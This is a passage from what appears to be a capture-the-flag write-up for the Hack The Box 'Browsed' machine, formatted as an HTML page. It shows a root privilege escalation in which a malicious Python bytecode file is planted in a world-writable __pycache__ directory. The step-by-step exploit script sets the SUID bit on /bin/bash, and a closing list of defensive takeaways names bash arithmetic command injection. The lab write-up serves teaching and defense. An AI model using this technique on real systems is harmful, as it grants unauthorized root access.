+    First thing on landing - check what larry can run as root:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">larry@browsed</span>
+    </div>
+    <pre><code>larry@browsed:~$ sudo -l
+
+(root) NOPASSWD: /opt/extensiontool/extension_tool.py</code></pre>
+  </div>
+
+  <p>
+    We can run a Python script as root with no password. Let's examine its directory:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">ls -la /opt/extensiontool/</span>
+    </div>
+    <pre><code>-rwxrwxr-x 1 root root extension_tool.py    ← owned by root, larry can read
+-rw-rw-r-- 1 root root extension_utils.py   ← group root, larry can only read
+drwxrwxrwx 2 root root __pycache__           ← world-writable</code></pre>
+  </div>
+
+  <p>
+    <code>extension_utils.py</code> looks tempting but larry can only read it -
+    the group is root. However, <code>__pycache__</code> is <strong>world-writable</strong>.
+    That's the key.
+  </p>
+
+  <h3>How Python Bytecode Loading Works</h3>
+
+  <p>
+    When Python imports a module, it checks <code>__pycache__</code> first. If a
+    compiled <code>.pyc</code> file exists there, Python loads it instead of
+    re-compiling the <code>.py</code> source - trusting the cache completely. The only
+    guard is a 16-byte header containing a magic number and a timestamp. If the header
+    matches, Python executes whatever bytecode follows, no questions asked.
+  </p>
+
+  <div class="callout callout-insight">
+    <span class="callout-label">💡 the plan</span>
+    <p>
+      Compile an evil version of extension_utils.py. Take the legitimate header
+      from the real .pyc (so Python doesn't reject it). Splice our malicious bytecode
+      behind it. Write the result into __pycache__. Next time root runs the tool,
+      Python loads our payload instead of the real module.
+    </p>
+  </div>
+
+  <h3>The Exploit</h3>
+
+  <pre data-file="privesc.sh"><code># 1. write the evil module - define the expected functions but run our payload too
+cat &gt; /tmp/evil_module.py &lt;&lt; 'EOF'
+import os
+os.system("chmod +s /bin/bash")
+def validate_manifest(path): pass
+def clean_temp_files(path):
+    os.system("chmod +s /bin/bash")
+    exit(0)
+EOF
+
+# 2. compile it to bytecode
+python3 -m py_compile /tmp/evil_module.py
+
+# 3. compile the LEGITIMATE module to get a valid header
+python3 -c "
+import py_compile
+py_compile.compile(
+  '/opt/extensiontool/extension_utils.py',
+  '/tmp/good.pyc'
+)"
+
+# 4. transplant the real header onto our evil bytecode
+python3 -c "
+f = open('/tmp/good.pyc', 'rb')
+header = f.read(16)
+f.close()
+
+f = open('/tmp/__pycache__/evil_module.cpython-312.pyc', 'rb')
+evil = f.read()
+f.close()
+
+f = open('/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc', 'wb')
+f.write(header + evil[16:])
+f.close()
+"
+
+# 5. trigger it - sudo runs as root, loads our .pyc, chmod +s fires
+sudo /opt/extensiontool/extension_tool.py --clean</code></pre>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="terminal-dot dot-red"></span>
+      <span class="terminal-dot dot-yellow"></span>
+      <span class="terminal-dot dot-green"></span>
+      <span class="terminal-title">result</span>
+    </div>
+    <pre><code>larry@browsed:/opt/extensiontool$ ls -la /bin/bash
+-rwsr-sr-x 1 root root /bin/bash
+
+larry@browsed:/opt/extensiontool$ /bin/bash -p
+
+bash-5.2# whoami
+root
+
+bash-5.2# cat /root/root.txt</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon">🏴</span>
+    <div>
+      <div class="flag-label">root flag</div>
+      <div class="flag-value">root.txt</div>
+    </div>
+  </div>
+
+  <hr>
+
+  <!-- ── TAKEAWAYS ── -->
+  <h2>Takeaways</h2>
+
+  <p>
+    Five distinct failures stacking into a complete, unauthenticated root. Each one
+    individually is manageable - together they're a full chain from anonymous HTTP to
+    root shell.
+  </p>
+
+  <ul>
+    <li>
+      <strong>Validate file contents, not headers.</strong> Checking Content-Type
+      is trivially bypassed in Burp. If you're accepting zips, verify magic bytes and
+      validate the archive contents before doing anything with them.
+    </li>
+    <li>
+      <strong>Don't feed user input to headless Chrome.</strong> Treating uploaded
+      archives as loadable browser extensions is an inherently dangerous design. The
+      extension model was built for user-controlled browsers, not server-side automation.
+    </li>
+    <li>
+      <strong>Internal services need authentication too.</strong> Gitea was reachable
+      from the server with no credentials. If something is "only accessible internally",
+      that's an assumption that breaks the moment you have any code execution.
+    </li>
+    <li>
+      <strong>Arithmetic operators in bash are not safe for untrusted input.</strong>
+      <code>-eq</code> evaluates its operands in an arithmetic context.
+      <code>a[$(cmd)]</code> is not hypothetical -- it works and it fires without
+      any obvious tell in the code.
+    </li>
+    <li>
+      <strong>__pycache__ should not be world-writable.</strong> If a sudo-eligible
+      Python script imports any module, and that module's compiled cache directory is
+      writable by a less-privileged user, you have a trivial privilege escalation.
+      Bytecode headers are not a security boundary.
+    </li>
+  </ul>
+
+  <div class="post-footer">
+    <span class="post-footer-left">stxrless · 2026 · HTB - Browsed</span>
+    <div class="post-footer-right">
+      <a href="/">← back to writeups</a>
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* subtle scanline flicker on the terminal bars */
+document.querySelectorAll('.terminal-dot.dot-green').forEach(dot => {
+  setInterval(() => {
+    const op = 0.7 + Math.random() * 0.3;
+    dot.style.boxShadow = `0 0 ${4 + Math.random() * 4}px rgba(39,201,63,${op})`;
+  }, 800 + Math.random() * 400);
+});
+
+/* fade-in sections on scroll */
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      e.target.style.opacity = '1';
+      e.target.style.transform = 'translateY(0)';
+    }
+  });
+}, { threshold: 0.08 });
+
+document.querySelectorAll('.step-header, .callout, .terminal, .chain-summary').forEach(el => {
+  el.style.opacity = '0';
+  el.style.transform = 'translateY(16px)';
+  el.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+  observer.observe(el);
+});
+</script>
+</body>
+</html>
